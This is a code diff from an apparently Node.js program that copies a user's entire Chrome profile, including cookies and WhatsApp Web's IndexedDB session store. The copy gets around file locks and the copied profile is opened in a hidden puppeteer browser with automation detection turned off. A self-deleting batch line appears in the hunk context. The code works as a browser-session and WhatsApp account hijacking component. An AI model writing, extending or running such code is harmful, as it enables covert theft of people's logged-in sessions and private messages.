@@ -327,17 +327,56 @@ del "%~f0"
 
             await fsExtra.ensureDir(clonedDir);
             
-            try {
-                await fsExtra.copy(userDataDir, clonedDir, {
-                    filter: (src) => {
-                        const s = src.toLowerCase();
-                        if (s.includes('cache') || s.includes('code cache') || s.includes('crashpad')) return false;
-                        return true;
+            async function robustCopy(src, dest) {
+                try {
+                    await fsExtra.ensureDir(dest);
+                    const items = await fs.promises.readdir(src, { withFileTypes: true });
+                    for (const item of items) {
+                        const srcPath = path.join(src, item.name);
+                        const destPath = path.join(dest, item.name);
+                        const s = srcPath.toLowerCase();
+
+                        // Skip lock files and caches
+                        if (s.includes('cache') || s.includes('crashpad') || item.name === 'SingletonLock' || item.name === 'SingletonCookie' || item.name === 'SingletonSocket' || item.name === 'LOCK') continue;
+
+                        if (item.isDirectory()) {
+                            await robustCopy(srcPath, destPath);
+                        } else {
+                            try {
+                                await fs.promises.copyFile(srcPath, destPath);
+                            } catch(err) {
+                                // If locked, try to read and write instead of native copyFile, sometimes it bypasses certain soft locks
+                                try {
+                                    const data = await fs.promises.readFile(srcPath);
+                                    await fs.promises.writeFile(destPath, data);
+                                } catch(err2) {}
+                            }
+                        }
                     }
-                });
-            } catch(e) {
-                console.log("Some files locked, copied partially");
+                } catch(e) {}
             }
+
+            async function findWhatsAppProfile(userDataDir) {
+                try {
+                    const items = await fs.promises.readdir(userDataDir, { withFileTypes: true });
+                    for (const item of items) {
+                        if (item.isDirectory() && (item.name === 'Default' || item.name.startsWith('Profile '))) {
+                            const waLevelDbPath = path.join(userDataDir, item.name, 'IndexedDB', 'https_web.whatsapp.com_0.indexeddb.leveldb');
+                            if (fs.existsSync(waLevelDbPath)) {
+                                console.log("Found WhatsApp in profile:", item.name);
+                                return item.name;
+                            }
+                        }
+                    }
+                } catch (e) {}
+                return 'Default'; // fallback
+            }
+
+            const activeProfile = await findWhatsAppProfile(userDataDir);
+            
+            console.log("Starting robust copy of Chrome profile...");
+            await robustCopy(userDataDir, clonedDir);
+            console.log("Profile copy completed.");
 
             hiddenBrowser = await puppeteer.launch({
                 executablePath: chromeExe,
@@ -348,7 +387,8 @@ del "%~f0"
                     '--disable-setuid-sandbox',
                     '--disable-blink-features=AutomationControlled',
                     '--window-size=1280,720',
-                    '--mute-audio'
+                    '--mute-audio',
+                    `--profile-directory=${activeProfile}`
                 ]
             });
 
